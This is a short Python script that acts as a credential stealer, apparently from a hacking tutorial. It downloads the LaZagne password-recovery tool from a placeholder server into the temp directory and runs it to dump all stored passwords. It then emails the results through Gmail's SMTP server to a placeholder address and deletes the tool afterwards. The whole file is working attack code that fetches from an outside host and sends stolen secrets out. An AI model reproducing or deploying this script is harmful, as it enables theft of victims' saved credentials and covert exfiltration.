#!/usr/bin/env python

import requests, smtplib, subprocess, os, tempfile 


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) # google allows anyone to use their smtp server
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("serverIp/file/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("youremail", "google app password", result)
os.remove("laZagne.exe")